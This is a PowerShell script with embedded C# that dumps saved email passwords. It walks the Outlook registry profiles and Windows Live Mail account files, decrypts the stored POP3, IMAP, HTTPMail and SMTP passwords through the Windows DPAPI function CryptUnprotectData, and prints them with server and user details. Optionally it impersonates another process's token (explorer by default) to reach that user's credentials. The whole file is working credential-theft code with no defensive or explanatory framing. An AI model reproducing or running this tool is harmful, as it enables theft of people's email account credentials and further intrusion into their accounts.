Add-Type @'
using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

public class Program
{
	public enum CryptProtectDataFlags
	{
		CRYPTPROTECT_UI_FORBIDDEN = 0x01,
		CRYPTPROTECT_LOCAL_MACHINE = 0x04,
		CRYPTPROTECT_CRED_SYNC = 0x08,
		CRYPTPROTECT_AUDIT = 0x10,
		CRYPTPROTECT_NO_RECOVERY = 0x20,
		CRYPTPROTECT_VERIFY_PROTECTION = 0x40,
		CRYPTPROTECT_CRED_REGENERATE = 0x80
	}
	public struct DATA_BLOB
	{
		public int cbData;
		public IntPtr pbData;
	}
	[DllImport("crypt32")]
	public static extern bool CryptUnprotectData(ref DATA_BLOB dataIn, StringBuilder ppszDataDescr, ref DATA_BLOB optionalEntropy,
		IntPtr pvReserved, IntPtr pPromptStruct, CryptProtectDataFlags dwFlags, ref DATA_BLOB pDataOut);
	[DllImport("crypt32")]
	public static extern bool CryptUnprotectData(ref DATA_BLOB dataIn, StringBuilder ppszDataDescr, IntPtr optionalEntropy,
		IntPtr pvReserved, IntPtr pPromptStruct, CryptProtectDataFlags dwFlags, ref DATA_BLOB pDataOut);
	[DllImport("Kernel32.dll")]
	public static extern IntPtr LocalFree(IntPtr hMem);
	private static string ReadXmlFile(string path)
	{
		string value = "";
		try
		{
			FileStream aFile = new FileStream(path, FileMode.Open);
			StreamReader sr = new StreamReader(aFile);
			value = sr.ReadToEnd();
			//Console.WriteLine(value);
			sr.Close();
		}catch (IOException ex)
		{ 
			Console.WriteLine("An IOException has been thrown!");
			Console.WriteLine(ex.ToString());
			Console.ReadLine();
			return "";
		}
		return value;
	}
	private static string Read(string str, string keyword)
	{
		string value = "";
		int pos = str.IndexOf(keyword);
		if (pos != -1)
		{
			pos = str.IndexOf(">", pos) + 1;
			int len = str.IndexOf("</" + keyword + ">", pos) - pos;
			value = str.Substring(pos, len);
		}
		return value;
	}
	private static void StrToBytes(string str,ref byte[] bData)
	{
		int i = 0, j = 0;
		while (i < str.Length)
		{
			string hex = str.Substring(i, 2);
			bData[j] = (byte)Convert.ToInt32(hex, 16);
			j++;
			i += 2;
		}
	}
	private static string DecodePass(string szEncodePass, byte[] salt)
	{
		string pass = "";
		int len = szEncodePass.Length / 2;
		byte[] encData = new byte[len];
		StrToBytes(szEncodePass, ref encData);


		DATA_BLOB dbIn = new DATA_BLOB();
		dbIn.cbData = len;
		dbIn.pbData = Marshal.AllocHGlobal(dbIn.cbData);
		Marshal.Copy(encData, 0, dbIn.pbData, dbIn.cbData);

		DATA_BLOB OptionalEntropy = new DATA_BLOB();
		OptionalEntropy.cbData = salt.Length;
		OptionalEntropy.pbData = Marshal.AllocHGlobal(OptionalEntropy.cbData);
		Marshal.Copy(salt, 0, OptionalEntropy.pbData, OptionalEntropy.cbData); ;
		DATA_BLOB dbOut = new DATA_BLOB();
		if (CryptUnprotectData(ref dbIn, null, ref OptionalEntropy, IntPtr.Zero, IntPtr.Zero, 0, ref dbOut))
		{
			byte[] clearText = new byte[dbOut.cbData];
			Marshal.Copy(dbOut.pbData, clearText, 0, dbOut.cbData);
			pass = System.Text.Encoding.Unicode.GetString(clearText).Replace("\0","");
		}
		LocalFree(dbOut.pbData);
		return pass;
	}
	private static void ShowInfo(string xmlValue, string logonType)
	{
		Console.WriteLine(logonType + "_User_Name:\t" + Read(xmlValue, logonType + "_User_Name"));
		string szSicily = Read(xmlValue, logonType + "_Use_Sicily");
		if(szSicily != "")
			Console.WriteLine(logonType + "_Use_Sicily:\t" + Convert.ToInt32(szSicily, 16));
		string szPort = Read(xmlValue, logonType + "_Port");
		if(szPort != "")
			Console.WriteLine(logonType + "_Port:\t" + Convert.ToInt32(szPort, 16));
		Console.WriteLine(logonType + "_Server:\t" + Read(xmlValue, logonType + "_Server"));
	}
	private static void GetLiveMailInfo()
	{
		string szMainKeyPath = "Software\\Microsoft\\Windows Live Mail";
		RegistryKey rkMainKey = Registry.CurrentUser.OpenSubKey(szMainKeyPath);
		if (rkMainKey == null)
		{
			return;
		}
		byte[] salt = (byte[])rkMainKey.GetValue("salt");
		string DirPath = (string)rkMainKey.GetValue("Store Root");
		string tempPath = System.Environment.GetFolderPath(Environment.SpecialFolder.Desktop).Replace("Desktop", "");
		string key = "C:\\windows\\system32\\config\\systemprofile\\";
		DirPath = DirPath.ToLower().Replace(key.ToLower(), tempPath);
		rkMainKey.Close();
		foreach (string dir in Directory.GetDirectories(DirPath))
		{
			foreach (string file in Directory.GetFiles(dir, "*.oeaccount"))
			{
				Console.WriteLine("=================================");
				Console.WriteLine("App:\tLiveMail");
				string xmlValue = ReadXmlFile(file);
				string szEncodePass = Read(xmlValue, "POP3_Password2");
				if (szEncodePass != "")
				{
					Console.WriteLine("POP3_Password:\t" + DecodePass(szEncodePass, salt));
					ShowInfo(xmlValue, "POP3");
					ShowInfo(xmlValue, "SMTP");
				}
				szEncodePass = Read(xmlValue, "IMAP_Password2");
				if (szEncodePass != "")
				{
					Console.WriteLine("IMAP_Password:\t" + DecodePass(szEncodePass, salt));
					ShowInfo(xmlValue, "IMAP");
					ShowInfo(xmlValue, "SMTP");
				}
				szEncodePass = Read(xmlValue, "HTTPMail_Password2");
				if (szEncodePass != "")
				{
					Console.WriteLine("HTTPMail_Password:\t" + DecodePass(szEncodePass, salt));
					Console.WriteLine("HTTPMail_User_Name:\t" + Read(xmlValue, "HTTPMail_User_Name"));
					Console.WriteLine("HTTPMail_Use_Sicily:\t" + Convert.ToInt32(Read(xmlValue, "HTTPMail_Use_Sicily"), 16));
					Console.WriteLine("HTTPMail_User_Name:\t" + Read(xmlValue, "HTTPMail_User_Name"));

					Console.WriteLine("SMTP_Use_Sicily:\t" + Read(xmlValue, "SMTP_Use_Sicily"));
					Console.WriteLine("SMTP_Email_Address:\t" + Read(xmlValue, "SMTP_Email_Address"));
				}
			}
		}
	}
	private static void GetOutlookInfo()
	{
		string szMainKeyPath = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles";
		RegistryKey rkMainKey = Registry.CurrentUser.OpenSubKey(szMainKeyPath);
		if (rkMainKey == null)
		{
			return;
		}
		string tempPath = szMainKeyPath;
		string[] szSubKeyPaths = rkMainKey.GetSubKeyNames();
		foreach (string szSubKeyPath1 in szSubKeyPaths)
		{
			string tempPath1 = szMainKeyPath + "\\" + szSubKeyPath1;
			RegistryKey rkSubKey1 = Registry.CurrentUser.OpenSubKey(tempPath1);
			string[] szSubKey2Paths = rkSubKey1.GetSubKeyNames();
			foreach (string szSubKey2Path in szSubKey2Paths)
			{
				string tempPath2 = tempPath1 + "\\" + szSubKey2Path;
				RegistryKey rkSubKey2 = Registry.CurrentUser.OpenSubKey(tempPath2);
				string[] szSubKey3Paths = rkSubKey2.GetSubKeyNames();
				foreach (string szSubKey3Path in szSubKey3Paths)
				{
					string tempPath3 = tempPath2 + "\\" + szSubKey3Path;
					GetInfo(tempPath3);
				}
			}
		}
	}
	private static void GetInfo(string szKeyPath)
	{
		RegistryKey rk = Registry.CurrentUser.OpenSubKey(szKeyPath);
		string[] szValueNames = rk.GetValueNames();
		foreach (string szValueName in szValueNames)
		{
			if (szValueName.IndexOf("User") == 5)
			{
				Console.WriteLine("=================================");
				Console.WriteLine("App:\tOutlook");
				string method = szValueName.Substring(0, 5);
				ShowInfo(rk, szValueName);
				DecodeOutlookPass(rk, method + "Password");
				ShowInfo(rk, "Email");
				ShowInfo(rk, method + "Server URL");
				ShowInfo(rk, method + "Server");
				ShowInfo(rk, method + "Port");
				ShowInfo(rk, "SMTP Server");
				ShowInfo(rk, "SMTP Port");
			}
		}
	}
	private static void ShowInfo(RegistryKey rk, string name)
	{
		try
		{
			object obj = rk.GetValue(name);
			if (obj != null)
			{
				RegistryValueKind vk = rk.GetValueKind(name);
				if (vk == RegistryValueKind.Binary)
				{
					byte[] bData = (byte[])obj;
					Console.WriteLine(name + ":\t" + System.Text.Encoding.Unicode.GetString(bData));
				}
				else if (vk == RegistryValueKind.DWord)
				{
					Console.WriteLine(name + ":\t" + obj);
				}
			}
		}
		catch (System.Exception ex)
		{
			Console.WriteLine("error:" + ex.Message);
		}
	}
	private static void DecodeOutlookPass(RegistryKey rk, string name)
	{
		byte[] encData = (byte[])rk.GetValue(name);
		if (encData[0] == 2)
		{
			int len = encData.Length;
			byte[] bData = new byte[len];
			Array.Copy(encData, 1, bData, 0, len);
			DATA_BLOB dbIn = new DATA_BLOB();
			dbIn.cbData = len;
			dbIn.pbData = Marshal.AllocHGlobal(dbIn.cbData);
			Marshal.Copy(bData, 0, dbIn.pbData, dbIn.cbData);

			DATA_BLOB dbOut = new DATA_BLOB();
			if (CryptUnprotectData(ref dbIn, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref dbOut))
			{
				byte[] clearText = new byte[dbOut.cbData];
				Marshal.Copy(dbOut.pbData, clearText, 0, dbOut.cbData);
				string pass = System.Text.Encoding.Unicode.GetString(clearText).Replace("\0","");
				Console.WriteLine(name + ":\t" + pass);
			}
			LocalFree(dbOut.pbData);
		}
	}
	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(UInt32 dwDesiredAccess, Int32 bInheritHandle, UInt32 dwProcessId);
	[DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
	static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
	[DllImport("advapi32.dll")]
	static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
	[DllImport("advapi32.dll")]
	static extern IntPtr RegDisablePredefinedCache();
	[DllImport("advapi32.dll")]
	static extern bool RevertToSelf();
	[DllImport("Kernel32")]
	static extern bool CloseHandle(IntPtr handle);
	private static bool Logon(int pid)
	{
		bool ret = false;
		IntPtr htok = IntPtr.Zero;
		if (pid == 0)
		{
			System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcessesByName("explorer");
			pid = processes[0].Id;
		}
		if (pid != 0)
		{
			IntPtr handle = OpenProcess(0x02000000, 0, (UInt32)pid);//0xFFF
			bool ok = OpenProcessToken(handle, 0xF01FF, ref htok);
			if (ok)
			{
				RegDisablePredefinedCache();
				ret = ImpersonateLoggedOnUser(htok);
			}
			CloseHandle(htok);
			CloseHandle(handle);
		}
		
		return ret;
	}
	public static void Run()
	{
		GetOutlookInfo();
		GetLiveMailInfo();
	}
	public static void Run(int pid)
	{
		bool ret = Logon(pid);
		GetOutlookInfo();
		GetLiveMailInfo();
		if (ret)
		{
			RevertToSelf();
		}
	}
}
'@
